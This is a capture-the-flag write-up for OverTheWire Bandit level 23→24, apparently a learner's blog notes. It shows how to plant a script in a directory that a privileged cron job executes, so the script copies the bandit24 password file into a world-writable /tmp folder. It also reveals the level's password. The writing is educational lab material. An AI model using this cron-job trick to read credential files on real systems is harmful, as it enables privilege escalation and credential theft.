# Bandit Level 23 → Level 24

### Level Goal
> A program is running periodically as a cronjob. This job executes all scripts it finds in /var/spool/bandit24/foo/ and then deletes them. We need to create our own script to steal the password from /etc/bandit_pass/bandit24.

### Discovery & Logic
1. **Analysis**: Checking /etc/cron.d/cronjob_bandit24 shows that a script is running every minute as user bandit24.
2. **Problem**: The script /usr/bin/cronjob_bandit24.sh enters the directory /var/spool/bandit24/foo/, checks for files owned by bandit23, executes them, and then deletes them.
3. **Solution**: Since we are user bandit23, we can create a script, when the cronjob runs our script, it runs with bandit24's privileges. We can make the script read the password file and save it to a public folder like /tmp.

### Commands Used
```bash
# 1. Create a workspace and set permissions so bandit24 can write into it
mkdir /tmp/bandit24_pw
cd /tmp/bandit24_pw
chmod 777 /tmp/bandit24_pw

# 2. Create the exploit script using 'echo' (to avoid nano terminal errors)
# This script will copy the secret password to our temp folder
echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pw/pass.txt" > bandit24_pass.sh

# 3. Make the script executable by everyone
chmod 777 bandit24_pass.sh

# 4. Copy the script to the spool directory where the cronjob looks for files
cp /tmp/bandit24_pw/bandit24_pass.sh /var/spool/bandit24/foo/

# 5. Wait 1 minute for the cronjob to execute.
# Check if 'pass.txt' has been created and owned by bandit24
ls -l /tmp/bandit24_pw/

# 6. Read the stolen password
cat /tmp/bandit24_pw/pass.txt
```

### What I Learned
* Cronjob Exploitation: Learned that automated tasks running as higher-privilege users can be leveraged to execute commands if they process user-controlled directories.
* Troubleshooting Terminal (TERM): Encountered xterm-kitty errors and learned to use export TERM=xterm or bypass editors using echo for script creation.
* Permissions Matter: Understood that for a script to work in this scenario, both the script and the target directory must have permissive chmod 777 settings so the cron user can read/write.

### Password Found
<details>
  <summary>Click to reveal password</summary>
  <code>gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</code>
</details>
